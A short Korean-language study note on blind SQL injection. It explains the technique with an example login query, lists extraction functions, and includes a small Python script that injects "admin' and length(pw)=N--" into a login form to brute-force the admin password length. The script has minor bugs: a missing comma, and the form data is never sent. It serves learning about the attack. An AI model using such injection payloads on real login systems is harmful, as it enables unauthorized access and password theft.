# blind sql injection

### blind sql injection 이란?

> 임의의 sql 구문을 만들어 데이터를 열람하는 공격이다.

즉 어떠한 데이터베이스에 공격을할때 임의의 query 를 만들어서 반환값을 이용해 한글자씩 따온다.

예 db 구조
```sql
database -> member
tables -> member
column -> (id,pw)
data -> ("admin","password"),("guest","guest")
```
```sql
SELECT * FROM member WHERE id='' and pw='';
```
위의 sql 쿼리로 login 을 체크할 시에
python 으로 blind sql injection 로 예를 든다면

```py
import requests

Url = "in url"

for length in range(1,100):
    data = {
        'uid':f"admin' and length(pw)={length}--'"
        'upw':'a'
    }

    r = requests.post(Url).text

    if r.find("Login succee!") > 0:
        print("admin user length pw : ",length)
        break
```

위의 python script 말고도 보고싶으면 밑의 링크에서 참고하면 좋다.

+ [blind sqli python script](https://github.com/kimminwyk/Study-notes/blob/master/MYSQL/MYSQL-SQL-injection/blind-sql-injection/blind-sql-injection-python-script.md)

+ [blind sqli node.js script](https://github.com/kimminwyk/Study-notes/blob/master/MYSQL/MYSQL-SQL-injection/blind-sql-injection/blind-sql-injection-node_js-script.md)


다음과 같은 예로 data 라는 변수에 dict 형식으로 

blind sqli 에 사용되는 쿼리를 만들어서 

requests 모듈로 요청한 뒤에 find 함수로 로그인 성공 감지됐다면 length 를 출력하는식이다.

* * *

간단하게 length(pw)={length} 에서 {} 안에 for loop 로 브루트포싱하여

참값이 될때까지 반복하는것이다.

위의 블라인드 인젝션이 성공되는 경우에는

```sql
SELECT * FROM member WHERE id='admin' and length(pw)=[1~100]
```

다음 쿼리와 같이 참의 값이 만들어져서 Login 이 우회되는것을 감지한다.

* * *

### length

그리고 mysql 에서 length() 는 안에 들어가는 데이터나 값을 넣으면 해당 데이터의 길이를 반환한다.

### 마무리

blind sqli 에서 length 말고도 다양한 쿼리가 존재한다

substr , left , ascii , mid 등등 다양한 문자열 , 길이를 브루트포싱하기위해 사용되는 함수가 많다.

